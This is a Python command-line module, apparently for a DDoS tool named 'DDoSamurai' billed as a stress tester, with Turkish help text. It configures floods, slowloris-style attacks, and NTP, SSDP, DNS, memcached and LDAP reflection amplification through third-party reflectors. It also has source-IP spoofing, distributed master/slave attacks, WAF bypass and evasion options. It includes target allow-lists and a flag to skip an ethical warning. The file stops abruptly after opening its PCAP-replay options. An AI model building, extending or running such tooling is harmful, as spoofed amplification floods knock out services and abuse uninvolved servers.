#!/usr/bin/env python3
import argparse
import asyncio
import random
import logging
import time
import json
import os
import sys
import ctypes
import multiprocessing
import yaml
from datetime import datetime, timezone

from . import packet
from . import stealth
from . import utils
from .workload_profiles import TEST_PROFILES, print_profiles
from .profile_names import H2_PROFILE_CHOICES, PROFILE_NONE, TLS_PROFILE_CHOICES

def _maybe_enable_uvloop():
    # Avoid side effects (prints / event loop changes) at import time.
    try:
        import uvloop
        uvloop.install()
        return True
    except Exception:
        return False

# Global constants from the original script
# These will be managed by the CLI arguments but are kept for reference
CONNECTION_POOL = 800
USER_AGENTS = [
    # A comprehensive list of user agents
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]


def _env_int(name: str, default: int) -> int:
    try:
        return int(os.environ.get(name, str(default)) or default)
    except Exception:
        return int(default)


def _is_cuda_raw_vector(args: argparse.Namespace) -> bool:
    """Return True when the selected route uses raw socket sending on CUDA path."""
    if str(getattr(args, "compute_backend", "cpu") or "cpu").strip().lower() != "cuda":
        return False
    vec = str(getattr(args, "attack_vector", "") or "").strip().lower()
    return vec in {
        "basic",
        "dns",
        "http",
        "anomaly",
        "ntp-amp",
        "ssdp-amp",
        "dns-amp",
        "memcached-amp",
        "ldap-amp",
    }

_SOAK_PROFILE_PRESETS = {
    "none": {
        "duration_s": 0,
        "snapshot_interval_s": 0,
        "warmup_s": 0,
        "max_error_rate_pct": 100.0,
        "max_pps_drop_pct": 100.0,
        "max_rss_growth_mb": 0.0,
        "max_vram_growth_mb": 0.0,
        "max_pinned_growth_mb": 0.0,
        "max_backlog": 0,
    },
    "1h": {
        "duration_s": 3600,
        "snapshot_interval_s": 10,
        "warmup_s": 60,
        "max_error_rate_pct": 1.0,
        "max_pps_drop_pct": 20.0,
        "max_rss_growth_mb": 512.0,
        "max_vram_growth_mb": 1024.0,
        "max_pinned_growth_mb": 2048.0,
        "max_backlog": 50000,
    },
    "6h": {
        "duration_s": 21600,
        "snapshot_interval_s": 20,
        "warmup_s": 120,
        "max_error_rate_pct": 1.0,
        "max_pps_drop_pct": 25.0,
        "max_rss_growth_mb": 1024.0,
        "max_vram_growth_mb": 2048.0,
        "max_pinned_growth_mb": 4096.0,
        "max_backlog": 100000,
    },
    "24h": {
        "duration_s": 86400,
        "snapshot_interval_s": 30,
        "warmup_s": 180,
        "max_error_rate_pct": 1.0,
        "max_pps_drop_pct": 30.0,
        "max_rss_growth_mb": 2048.0,
        "max_vram_growth_mb": 3072.0,
        "max_pinned_growth_mb": 8192.0,
        "max_backlog": 200000,
    },
}

def is_admin():
    """Checks if the current process has administrator/root privileges."""
    try:
        # Linux/Unix check
        if hasattr(os, 'geteuid'):
            return os.geteuid() == 0
        # Windows check
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def apply_profile(args):
    """
    Applies predefined corporate attack profiles to arguments.
    """
    profile = args.profile
    if profile == "custom" or profile not in TEST_PROFILES:
        return

    prof = TEST_PROFILES[profile]["args"]
    # Log what profile is applied
    utils.log_info(f"[{profile.upper()}] Corporate Profile Applied: {TEST_PROFILES[profile]['description']}")
    
    # Overwrite args with profile defaults.
    for key, val in prof.items():
        # Only overwrite if the user did not specify a non-default via CLI. 
        # (For simplicity, we just enforce the profile settings, but this can be refined to check sys.argv)
        # Here we just apply them directly. 
        if hasattr(args, key):
             setattr(args, key, val)
             
    # Example post-processing log
    utils.log_info(f" -> Setting inherited arguments: {prof}")


def print_distributed_info(role):
    """
    Prints information about the distributed attack mode.
    """
    if role == "master":
        utils.log_info("Distributed attack modu: MASTER - Slave'ler bekleniyor.")
    elif role == "slave":
        utils.log_info("Distributed attack modu: SLAVE - Master'a bağlanılıyor.")
    else:
        utils.log_info("Distributed attack modu: STANDALONE")


def _resolve_profile_args(parser: argparse.ArgumentParser, args: argparse.Namespace, argv) -> None:
    argv_list = list(sys.argv[1:] if argv is None else argv)
    tls_explicit = "--tls-profile" in argv_list
    ja3_explicit = "--ja3-profile" in argv_list

    legacy = getattr(args, "ja3_profile", None)
    if legacy is not None and (ja3_explicit or str(legacy) != str(getattr(args, "tls_profile", PROFILE_NONE))):
        if tls_explicit and str(args.tls_profile) != str(legacy):
            parser.error("Hata: --tls-profile ve --ja3-profile farklı değerlerle birlikte kullanılamaz.")
        args.tls_profile = str(legacy)
        utils.log_warning("DEPRECATION: --ja3-profile yakında kaldırılacak; yerine --tls-profile kullanın.")

    if str(getattr(args, "tls_profile", PROFILE_NONE)).strip().lower() == "":
        args.tls_profile = PROFILE_NONE
    if str(getattr(args, "h2_profile", PROFILE_NONE)).strip().lower() == "":
        args.h2_profile = PROFILE_NONE

    # Backward-compat field kept for code paths that still inspect ja3_profile.
    args.ja3_profile = args.tls_profile


def _aggregate_worker_events(events):
    summary = {
        "workers_total": 0,
        "workers_ok": 0,
        "workers_failed": 0,
        "workers_interrupted": 0,
        "attempted_total": 0,
        "sent_total": 0,
        "errors_total": 0,
        "bytes_sent_est_total": 0,
        "duration_s_sum": 0.0,
        "duration_s_max": 0.0,
        "by_vector": {},
        "by_backend": {},
        "by_status": {},
    }
    for ev in list(events or []):
        if not isinstance(ev, dict):
            continue
        summary["workers_total"] += 1
        status = str(ev.get("status", "unknown"))
        if status == "ok":
            summary["workers_ok"] += 1
        elif status == "interrupted":
            summary["workers_interrupted"] += 1
        else:
            summary["workers_failed"] += 1
        summary["by_status"][status] = int(summary["by_status"].get(status, 0)) + 1

        dur = float(ev.get("duration_s", 0.0) or 0.0)
        summary["duration_s_sum"] += dur
        summary["duration_s_max"] = max(summary["duration_s_max"], dur)

        st = ev.get("stats") or {}
        attempted = int(st.get("attempted", 0) or 0)
        sent = int(st.get("sent", 0) or 0)
        errors = int(st.get("errors", 0) or 0)
        bytes_sent = int(st.get("bytes_sent_est", 0) or 0)

        summary["attempted_total"] += attempted
        summary["sent_total"] += sent
        summary["errors_total"] += errors
        summary["bytes_sent_est_total"] += bytes_sent

        vec = str(ev.get("attack_vector", "unknown"))
        be = str(ev.get("compute_backend", "unknown"))

        v = summary["by_vector"].setdefault(vec, {"attempted": 0, "sent": 0, "errors": 0, "workers": 0})
        v["attempted"] += attempted
        v["sent"] += sent
        v["errors"] += errors
        v["workers"] += 1

        b = summary["by_backend"].setdefault(be, {"attempted": 0, "sent": 0, "errors": 0, "workers": 0})
        b["attempted"] += attempted
        b["sent"] += sent
        b["errors"] += errors
        b["workers"] += 1

    return summary


def _report_inputs_from_args(args) -> dict:
    return {
        "target": str(getattr(args, "target", "")),
        "port": int(getattr(args, "port", 0) or 0),
        "protocol": str(getattr(args, "protocol", "")),
        "attack_vector": str(getattr(args, "attack_vector", "")),
        "compute_backend": str(getattr(args, "compute_backend", "")),
        "count": int(getattr(args, "count", 0) or 0),
        "workers": int(getattr(args, "workers", 0) or 0),
        "rps": float(getattr(args, "rps", 0) or 0),
        "pacing_mode": str(getattr(args, "pacing_mode", "none")),
        "ninja_mode": bool(getattr(args, "ninja_mode", False)),
        "spoof": bool(getattr(args, "spoof", False)),
        "spoof_mode": str(getattr(args, "spoof_mode", "")),
        "http_scheme": str(getattr(args, "http_scheme", "http")),
        "http_method": str(getattr(args, "http_method", "GET")),
        "tls_profile": str(getattr(args, "tls_profile", PROFILE_NONE)),
        "h2_profile": str(getattr(args, "h2_profile", PROFILE_NONE)),
        "soak_profile": str(getattr(args, "soak_profile", "none")),
        "soak_warmup_s": int(getattr(args, "soak_warmup_s", 0) or 0),
        "gpu_template_pool_size_l4": int(getattr(args, "gpu_template_pool_size_l4", 10) or 10),
        "gpu_template_pool_size_l7": int(getattr(args, "gpu_template_pool_size_l7", 50) or 50),
        "gpu_ring_capacity": int(getattr(args, "gpu_ring_capacity", 3) or 3),
        "gpu_pinned_max_mb": int(getattr(args, "gpu_pinned_max_mb", 512) or 512),
        "gpu_rng_seed": int(getattr(args, "gpu_rng_seed", 1234) or 0) if getattr(args, "gpu_rng_seed", None) is not None else None,
        "state_table_size": int(getattr(args, "state_table_size", 65536) or 65536),
        "state_lock_count": int(getattr(args, "state_lock_count", 256) or 256),
        "state_timeout_sec": int(getattr(args, "state_timeout_sec", 60) or 60),
        "state_sweep_interval_ms": int(getattr(args, "state_sweep_interval_ms", 1000) or 1000),
        "loss_telemetry": str(getattr(args, "loss_telemetry", "auto")),
        "loss_iface": str(getattr(args, "loss_iface", "")),
        "loss_fail_pct": float(getattr(args, "loss_fail_pct", 5.0) or 5.0),
        "fault_inject": list(getattr(args, "fault_inject", []) or []),
    }


def _build_soak_config(args) -> dict | None:
    profile_name = str(getattr(args, "soak_profile", "none") or "none").lower()
    base = dict(_SOAK_PROFILE_PRESETS.get(profile_name, _SOAK_PROFILE_PRESETS["none"]))
    if profile_name == "none":
        return None

    snapshot_interval = int(getattr(args, "soak_snapshot_interval", 0) or 0)
    if snapshot_interval <= 0:
        snapshot_interval = int(base.get("snapshot_interval_s", 10))
    snapshot_interval = max(10, min(30, snapshot_interval))

    def _f(name: str, default: float) -> float:
        v = getattr(args, name, None)
        return float(default if v is None else v)

    def _i(name: str, default: int) -> int:
        v = getattr(args, name, None)
        return int(default if v is None else v)

    return {
        "profile": profile_name,
        "duration_s": int(base.get("duration_s", 0)),
        "snapshot_interval_s": int(snapshot_interval),
        "warmup_s": _i("soak_warmup_s", int(base.get("warmup_s", 60))),
        "max_error_rate_pct": _f("soak_max_error_rate_pct", float(base.get("max_error_rate_pct", 1.0))),
        "max_pps_drop_pct": _f("soak_max_pps_drop_pct", float(base.get("max_pps_drop_pct", 20.0))),
        "max_rss_growth_mb": _f("soak_max_rss_growth_mb", float(base.get("max_rss_growth_mb", 0.0))),
        "max_vram_growth_mb": _f("soak_max_vram_growth_mb", float(base.get("max_vram_growth_mb", 0.0))),
        "max_pinned_growth_mb": _f("soak_max_pinned_growth_mb", float(base.get("max_pinned_growth_mb", 0.0))),
        "max_backlog": _i("soak_max_backlog", int(base.get("max_backlog", 0))),
    }


def _validate_pacing_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    mode = str(getattr(args, "pacing_mode", "none") or "none").strip().lower()
    rps = float(getattr(args, "rps", 0.0) or 0.0)
    ipg = int(getattr(args, "ipg", 0) or 0)
    burst_size = int(getattr(args, "burst_size", 64) or 0)
    burst_gap = int(getattr(args, "burst_gap", 0) or 0)
    jitter_pct = float(getattr(args, "jitter_pct", 0.0) or 0.0)

    if mode == "rps" and rps <= 0:
        parser.error("Hata: --pacing-mode rps için --rps > 0 olmalıdır.")
    if mode == "ipg" and ipg <= 0:
        parser.error("Hata: --pacing-mode ipg için --ipg > 0 olmalıdır.")
    if mode == "burst" and burst_size < 1:
        parser.error("Hata: --pacing-mode burst için --burst-size >= 1 olmalıdır.")
    if burst_gap < 0:
        parser.error("Hata: --burst-gap >= 0 olmalıdır.")
    if jitter_pct < 0.0 or jitter_pct > 1.0:
        parser.error("Hata: --jitter-pct 0.0 ile 1.0 aralığında olmalıdır.")

    # Keep legacy auto-promote behavior: --rps without explicit pacing mode.
    if mode == "none" and rps > 0:
        utils.log_info(
            "--rps > 0 ve --pacing-mode none: worker tarafında pacing-mode otomatik rps'e yükseltilecek."
        )


def _validate_hybrid_cuda_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    # Unified sanity checks for new hybrid CUDA + state engine knobs.
    for name in (
        "gpu_template_pool_size_l4",
        "gpu_template_pool_size_l7",
        "gpu_ring_capacity",
        "gpu_pinned_max_mb",
        "state_table_size",
        "state_lock_count",
        "state_timeout_sec",
        "state_sweep_interval_ms",
    ):
        value = int(getattr(args, name, 0) or 0)
        if value <= 0:
            parser.error(f"Hata: --{name.replace('_', '-')} pozitif bir tamsayı olmalıdır.")

    table_size = int(getattr(args, "state_table_size", 65536) or 65536)
    lock_count = int(getattr(args, "state_lock_count", 256) or 256)
    if table_size % lock_count != 0:
        parser.error("Hata: --state-table-size değeri --state-lock-count değerine tam bölünmelidir.")
    rng_seed = int(getattr(args, "gpu_rng_seed", 1234) or 0)
    if rng_seed < 0 or rng_seed > 0xFFFFFFFF:
        parser.error("Hata: --gpu-rng-seed 0..4294967295 aralığında olmalıdır.")

def build_parser() -> argparse.ArgumentParser:
    """
    Build the CLI argument parser.
    Kept separate to make testing and maintenance easier.
    """
    parser = argparse.ArgumentParser(
        description="Modüler ve yüksek performanslı ağ stres testi aracı - DDoSamurai",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument("--config", type=str, help="Tüm ayarların okunacağı YAML konfigürasyon dosyasının yolu.")
    parser.add_argument("--list-profiles", action="store_true", help="Kullanılabilir kurumsal saldırı test profillerini listele.")
    parser.add_argument("-t", "--target", help="Hedef IP adresi (config dosyasında da belirtilebilir)")
    parser.add_argument("-p", "--port", type=int, help="Hedef port (config dosyasında da belirtilebilir)")
    parser.add_argument("--source-port", type=int, default=0, help="Kaynak port (0: rastgele)")
    parser.add_argument("-c", "--count", type=int, default=10, help="Gönderilecek toplam paket/istek sayısı")
    parser.add_argument("-P", "--protocol", choices=["tcp", "udp", "icmp"], default="tcp", help="Kullanılacak protokol (tcp/udp/icmp)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Paketler arası gecikme (saniye cinsinden) - RPS ile birlikte kullanılmaz")

    spoofing_group = parser.add_argument_group('IP Spoofing Options')
    spoofing_group.add_argument("--spoof", action="store_true", help="IP sahtekarlığını etkinleştir (varsayılan mod: realistic)")
    spoofing_group.add_argument("--spoof-mode", choices=['random', 'realistic', 'subnet', 'list'], default='realistic', help="IP sahtekarlık modu")
    spoofing_group.add_argument("--spoof-subnet", type=str, help="'subnet' modu için CIDR formatında alt ağ (örn: 192.168.1.0/24)")
    spoofing_group.add_argument("--spoof-list-file", type=str, help="'list' modu için her satırda bir IP içeren dosya yolu")

    parser.add_argument("--payload", type=str, default="", help="Tek bir istek için gönderilecek sabit payload.")
    parser.add_argument("--payload-file", type=str, default="", help="Her satırı bir payload olan ve isteklerde rastgele kullanılacak dosyanın yolu.")
    parser.add_argument("--tcp-flags", type=str, default="S", choices=["S", "A", "F", "R", "SA", "FA", "RA", "PA", "U", "E", "C"], help="TCP bayrakları (örn: S, A, F, R, SA, FA, RA, PA, U, E, C vb.)")
    parser.add_argument("--ttl", type=int, help="IP paketi için TTL değeri")
    parser.add_argument("--tos", type=int, help="IP TOS değeri (ondalık formatta, örn: 16)")
    parser.add_argument("--window", type=int, help="TCP pencere boyutu")
    parser.add_argument("--os-fingerprint", action="store_true", help="Enable OS fingerprint randomization for packets.")
    parser.add_argument("--pad", type=int, default=0, help="Minimum paket boyutu (bayt).")
    parser.add_argument("--ninja-mode", action="store_true", help="Enable WAF Bypass (Ninja Mode) using Headless Browser.")
    parser.add_argument("--fragment", action="store_true", help="IP fragmentasyonunu etkinleştir (Scapy/CPU yolu).")
    parser.add_argument("--fragment-size", type=int, default=800, help="Fragment boyutu (bayt). (Varsayılan: 800)")

    # NOTE: Keep this list aligned with ddos_samurai.orchestrator + ddos_samurai.senders.
    parser.add_argument(
        "--attack-vector",
        choices=[
            "basic",
            "http",
            "http2",
            "dns",
            "websocket",
            "quic",
            "slowloris",
            "slow-post",
            "slow-read",
            "ntp-amp",
            "ssdp-amp",
            "dns-amp",
            "memcached-amp",
            "ldap-amp",
            "anomaly",
            "pcap-replay",
        ],
        default="basic",
        help="Saldırı vektörü seçimi",
    )

    amp_group = parser.add_argument_group('Amplification Attack Options')
    amp_group.add_argument("--reflector-file", type=str, help="Yansıtıcı sunucu IP'lerini içeren dosyanın yolu (amplification saldırısı için gereklidir).")

    parser.add_argument("--dns-name", type=str, default="example.com", help="DNS vektörü için sorgu adı")
    parser.add_argument("--dns-qtype", type=str, nargs='+', default=["A"], help="DNS sorgu tipleri (birden fazla belirtilebilir: A AAAA MX TXT NS)")
    parser.add_argument("--dns-edns", action="store_true", help="DNS için EDNS0 OPT kaydı ekle")
    parser.add_argument("--dns-nord", action="store_true", help="DNS recursive desired kapat (rd=0)")
    parser.add_argument("--http-path", type=str, nargs='+', default=["/"], help="HTTP vektörü için istek yolları (birden fazla belirtilebilir)")
    parser.add_argument("--http-method", type=str, default="GET", help="HTTP vektörü için metod (GET, POST, ...)" )
    parser.add_argument("--http-concurrency", type=int, default=50, help="HTTP vektörü eşzamanlı istek sayısı (worker başına)")
    parser.add_argument("--http-timeout", type=float, default=5.0, help="HTTP istek zaman aşımı (s)")
    parser.add_argument("--http-retries", type=int, default=0, help="HTTP istek retry sayısı")
    parser.add_argument("--http-scheme", choices=["http","https"], default="http", help="HTTP vektörü için şema")
    parser.add_argument("--http-verify", type=str, default="true", help="HTTPS sertifika doğrulama (true/false)")
    parser.add_argument("--rps", type=float, default=0, help="Hedef toplam istek/paket saniye (tüm worker'lar için, 0: sınırsız)")
    parser.add_argument("--jitter", type=float, default=0.0, help="Rastgele zamanlama jitter oranı (0..1)")
    parser.add_argument("--ramp", type=float, default=0.0, help="RPS'e ramp-up süresi (s)")
    parser.add_argument("--profile", choices=list(TEST_PROFILES.keys()), default="custom", help="Kurumsal saldırı testi profili (varsayılan: custom)")
    parser.add_argument("--role", choices=["standalone", "master", "slave"], default="standalone", help="Distributed attack modu")
    parser.add_argument("--confirm", action="store_true", help="Etik uyarıyı atlamak için")
    parser.add_argument("--dry-run", action="store_true", help="Ayarları doğrular, örnek bir paket oluşturur ve gönderim yapmadan çıkar.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
    parser.add_argument("--log", type=str, default="ddos_logs.txt", help="Log dosyası yolu")
    parser.add_argument("--workers", type=int, default=multiprocessing.cpu_count(), help=f"Kullanılacak işçi (worker) süreç sayısı. Varsayılan: {multiprocessing.cpu_count()}")
    parser.add_argument("--tls-profile", choices=list(TLS_PROFILE_CHOICES), default=PROFILE_NONE, help="TLS/JA3 parmak izi profili")
    parser.add_argument("--h2-profile", choices=list(H2_PROFILE_CHOICES), default=PROFILE_NONE, help="HTTP/2 profil adı")
    parser.add_argument("--ja3-profile", choices=list(TLS_PROFILE_CHOICES), default=None, help="DEPRECATED: --tls-profile alias (1 minor sürüm)")
    parser.add_argument("--ech", action="store_true", help="Encrypted Client Hello (ECH) desteğini etkinleştir (deneysel)")
    parser.add_argument("--http2-concurrency", type=int, default=100, help="HTTP/2 vektörü için eşzamanlı stream sayısı")
    parser.add_argument("--ws-path", type=str, default="/", help="WebSocket vektörü için bağlantı yolu")
    parser.add_argument("--ws-message", type=str, default="ping", help="WebSocket vektörü için gönderilecek mesaj")
    parser.add_argument("--ws-concurrency", type=int, default=50, help="WebSocket vektörü eşzamanlı bağlantı sayısı")
    parser.add_argument("--quic-path", type=str, default="/", help="QUIC/HTTP3 vektörü için istek yolu")
    parser.add_argument("--quic-method", type=str, default="GET", help="QUIC/HTTP3 vektörü için HTTP metodu")
    parser.add_argument("--quic-concurrency", type=int, default=50, help="QUIC/HTTP3 vektörü eşzamanlı istek sayısı")
    parser.add_argument("--slowloris-concurrency", type=int, default=200, help="Slowloris vektörü eşzamanlı bağlantı sayısı")
    parser.add_argument("--stealth-mode", action="store_true", help="DEPRECATED (no-op): kaldırılacak")
    parser.add_argument("--payload-mutation", action="store_true", help="Payload mutation - her istekte payload'u değiştir")
    parser.add_argument("--proxy-list", type=str, help="Proxy listesi dosyası (her satırda bir proxy)")
    parser.add_argument("--aggressive-mode", action="store_true", help="Agresif mod - daha hızlı ve yoğun saldırı")
    parser.add_argument("--connection-pool", type=int, default=100, help="Maksimum bağlantı havuzu boyutu")
    parser.add_argument("--burst-mode", action="store_true", help="Burst mod - kısa süreli yoğun saldırı")
    parser.add_argument("--spoof-ip", type=str, help="Belirli bir IP adresi ile spoofing yap (örn: 1.1.1.1)")
    parser.add_argument("--realistic-spoof", action="store_true", help="Gerçekçi IP aralıklarından spoofing yap")
    parser.add_argument("--evasion-techniques", type=str, nargs='+', choices=['case', 'url', 'comment'], help="DEPRECATED (no-op): kaldırılacak")
    parser.add_argument("--compute-backend", type=str, default="cpu", choices=["cpu", "cuda"], help="Paket oluşturma için kullanılacak işlem birimi (cpu veya cuda)")
    parser.add_argument("--stateful", action="store_true", help="Enable Stateful TCP Engine (Viper-State) for full 3-way handshake.")
    parser.add_argument(
        "--gpu-template-pool-size-l4",
        type=int,
        default=_env_int("SAMURAI_GPU_TEMPLATE_POOL_SIZE_L4", 10),
        help="CUDA template-pool L4 varsayılan şablon sayısı (env: SAMURAI_GPU_TEMPLATE_POOL_SIZE_L4).",
    )
    parser.add_argument(
        "--gpu-template-pool-size-l7",
        type=int,
        default=_env_int("SAMURAI_GPU_TEMPLATE_POOL_SIZE_L7", 50),
        help="CUDA template-pool L7 set varsayılan şablon sayısı (env: SAMURAI_GPU_TEMPLATE_POOL_SIZE_L7).",
    )
    parser.add_argument(
        "--gpu-ring-capacity",
        type=int,
        default=_env_int("SAMURAI_GPU_RING_CAPACITY", 3),
        help="CUDA producer-consumer ring kapasitesi (env: SAMURAI_GPU_RING_CAPACITY).",
    )
    parser.add_argument(
        "--gpu-pinned-max-mb",
        type=int,
        default=_env_int("SAMURAI_GPU_PINNED_MAX_MB", 512),
        help="Pinned host buffer pool üst sınırı MB (env: SAMURAI_GPU_PINNED_MAX_MB).",
    )
    parser.add_argument(
        "--gpu-rng-seed",
        type=int,
        default=_env_int("SAMURAI_GPU_RNG_SEED", 1234),
        help="GPU payload RNG seed (varsayılan: deterministik 1234, env: SAMURAI_GPU_RNG_SEED).",
    )
    parser.add_argument(
        "--state-table-size",
        type=int,
        default=_env_int("SAMURAI_STATE_TABLE_SIZE", 65536),
        help="State engine tablosu kapasitesi (env: SAMURAI_STATE_TABLE_SIZE).",
    )
    parser.add_argument(
        "--state-lock-count",
        type=int,
        default=_env_int("SAMURAI_STATE_LOCK_COUNT", 256),
        help="State engine lock segment sayısı (env: SAMURAI_STATE_LOCK_COUNT).",
    )
    parser.add_argument(
        "--state-timeout-sec",
        type=int,
        default=_env_int("SAMURAI_STATE_TIMEOUT_SEC", 60),
        help="State timeout süresi saniye (env: SAMURAI_STATE_TIMEOUT_SEC).",
    )
    parser.add_argument(
        "--state-sweep-interval-ms",
        type=int,
        default=_env_int("SAMURAI_STATE_SWEEP_INTERVAL_MS", 1000),
        help="State cleanup sweep periyodu ms (env: SAMURAI_STATE_SWEEP_INTERVAL_MS).",
    )

    pcap_group = parser.add_argument_group("GPU PCAP Generator (Test)")
    pcap_group.add_argument(
        "--gpu-pcap",
        action="store_true",
        help="GPU üzerinde sentetik PCAP üret ve çık (trafik göndermez).",
    )
    pcap_group.add_argument("--gpu-pcap-duration", type=int, default=10, help="PCAP süresi (s)")
    pcap_group.add_argument("--gpu-pcap-pps", type=int, default=10000, help="Saniye başı paket sayısı (PPS)")
    pcap_group.add_argument("--gpu-pcap-mode", choices=["mix", "tcp", "udp"], default="mix", help="Trafik modu")
    pcap_group.add_argument("--gpu-pcap-src-ip", type=str, default="192.168.1.100", help="Kaynak IPv4")
    pcap_group.add_argument(
        "--gpu-pcap-dst-ip",
        type=str,
        default="",
        help="Hedef IPv4 (boşsa: --target veya 127.0.0.1)",
    )
    pcap_group.add_argument(
        "--gpu-pcap-tcp-port",
        type=int,
        default=0,
        help="TCP hedef port (0 ise: --port veya 80)",
    )
    pcap_group.add_argument(
        "--gpu-pcap-udp-port",
        type=int,
        default=0,
        help="UDP hedef port (0 ise: --port veya 53)",
    )
    pcap_group.add_argument("--gpu-pcap-chunk", type=int, default=200000, help="Chunk başına paket sayısı")
    pcap_group.add_argument("--gpu-pcap-seed", type=int, default=0, help="RNG seed (0: rastgele)")
    pcap_group.add_argument(
        "--gpu-pcap-flow-count",
        type=int,
        default=4096,
        help="Flow havuzu boyutu (gerçekçi modda kaynak port/IP çeşitliliği için).",
    )
    pcap_group.add_argument(
        "--gpu-pcap-realistic",
        action="store_true",
        help="Gerçekçiliği artırılmış flow-aware profil (TTL/TOS varyasyonu, stateful TCP, UDP checksum).",
    )
    pcap_group.add_argument(
        "--gpu-pcap-udp-checksum",
        action="store_true",
        help="UDP checksum hesaplamasını etkinleştir.",
    )
    pcap_group.add_argument(
        "--gpu-pcap-variable-size",
        action="store_true",
        help="Değişken paket boyutu üretimini etkinleştir (V2).",
    )
    pcap_group.add_argument(
        "--gpu-pcap-mtu",
        type=int,
        default=1500,
        help="L3 MTU değeri (128-1500). Paket boyutu dağılımı bu sınıra göre üretilir.",
    )
    pcap_group.add_argument(
        "--gpu-pcap-size-profile",
        choices=["mixed", "web", "dns"],
        default="mixed",
        help="Değişken paket boyutu profili.",
    )
    pcap_group.add_argument(
        "--gpu-pcap-realism-report",
        action="store_true",
        help="Üretilen PCAP için V3 gerçekçilik skoru ve metrik raporu üret.",
    )
    pcap_group.add_argument(
        "--gpu-pcap-realism-baseline",
        type=str,
        default="",
        help="Gerçekçilik skorunu bu referans PCAP'a göre hesapla (opsiyonel).",
    )
    pcap_group.add_argument(
        "--gpu-pcap-realism-sample",
        type=int,
        default=100000,
        help="Gerçekçilik analizinde incelenecek maksimum paket sayısı.",
    )
    pcap_group.add_argument(
        "--gpu-pcap-realism-out",
        type=str,
        default="",
        help="Gerçekçilik raporu JSON dosya adı (varsayılan: <out>.realism.json).",
    )
    pcap_group.add_argument(
        "--gpu-pcap-out",
        type=str,
        default="",
        help="Çıktı dosya adı (proje klasörüne kaydedilir)",
    )
    pcap_group.add_argument(
        "--gpu-pcap-run-report",
        action="store_true",
        help="GPU PCAP calismasi icin musteri-odakli run raporu uret (JSON/Markdown).",
    )
    pcap_group.add_argument(
        "--gpu-pcap-run-report-format",
        choices=["json", "md", "both"],
        default="both",
        help="Run raporu cikti formati.",
    )
    pcap_group.add_argument(
        "--gpu-pcap-run-report-out",
        type=str,
        default="",
        help="Run raporu dosya adi (bossa: <out>.run.json/.md).",
    )

    pacing_group = parser.add_argument_group('Pacing Options (Deterministic Timing)')
    pacing_group.add_argument(
        "--pacing-mode",
        choices=["none", "rps", "ipg", "burst"],
        default="none",
        help="Paket pacing stratejisi: none=sınırsız burst, rps=rate-limit, ipg=sabit gap, burst=batch+gap",
    )
    pacing_group.add_argument(
        "--ipg",
        type=int,
        default=0,
        help="Inter-Packet Gap (nanosaniye). --pacing-mode ipg ile kullanılır. Örnek: 10000 = 10µs",
    )
    pacing_group.add_argument(
        "--burst-size",
        type=int,
        default=64,
        help="Burst modunda tek seferde gönderilecek paket sayısı (varsayılan: 64)",
    )
    pacing_group.add_argument(
        "--burst-gap",
        type=int,
        default=0,
        help="Burst'ler arası bekleme süresi (nanosaniye)",
    )
    pacing_group.add_argument(
        "--jitter-model",
        choices=["none", "uniform", "gaussian", "exponential"],
        default="none",
        help="Jitter dağılım modeli (pacing üzerine uygulanır)",
    )
    pacing_group.add_argument(
        "--jitter-pct",
        type=float,
        default=0.0,
        help="Jitter yüzdesi (0.0-1.0). Base gap'in bu kadarı kadar sapma uygulanır.",
    )
    pacing_group.add_argument(
        "--pin-cpu",
        type=int,
        default=-1,
        help="Pacing engine'i belirli bir CPU çekirdeğine sabitle (-1: otomatik)",
    )
    pacing_group.add_argument(
        "--use-so-txtime",
        action="store_true",
        help="Kernel SO_TXTIME/ETF offload kullan (Linux 4.19+, root gerektirir)",
    )

    safety_group = parser.add_argument_group("Safety Options")
    safety_group.add_argument(
        "--allow-target",
        action="append",
        default=[],
        help="İzin verilen hedef(ler). IP veya CIDR. Çoklu kullanım: --allow-target 10.0.0.0/8 --allow-target 192.168.1.10",
    )
    safety_group.add_argument(
        "--allow-public-target",
        action="store_true",
        help="Public (internet) hedeflere izin ver (tehlikeli). Varsayılan: engelli.",
    )

    anomaly_group = parser.add_argument_group('Anomaly Packet Options')
    anomaly_group.add_argument("--anomaly-types", type=int, nargs='+', default=None,
        help="Anomaly types to use (0=InvalidIHL, 1=InvalidIPLen, 2=InvalidIPVer, 3=InvalidProto, "
             "4=TCPFlagAbuse, 5=InvalidTCPOffset, 6=OverlapFrags, 7=TinyFrags, 8=LandAttack, "
             "9=InvalidChecksum, 10=TTLAnomaly, 11=MalformedOptions). Default: all.")
    anomaly_group.add_argument("--anomaly-intensity", type=int, default=75,
        help="Anomaly intensity 0-100 (how malformed the packets are). Default: 75")
    anomaly_group.add_argument("--anomaly-suite", action="store_true",
        help="Use full anomaly suite (standard + overlapping frags + tiny frags)")

    # ── PCAP Replay Options ──────────────────────────────────────────────────
    pcap_replay_group = parser.add_argument_group('PCAP Replay Options')
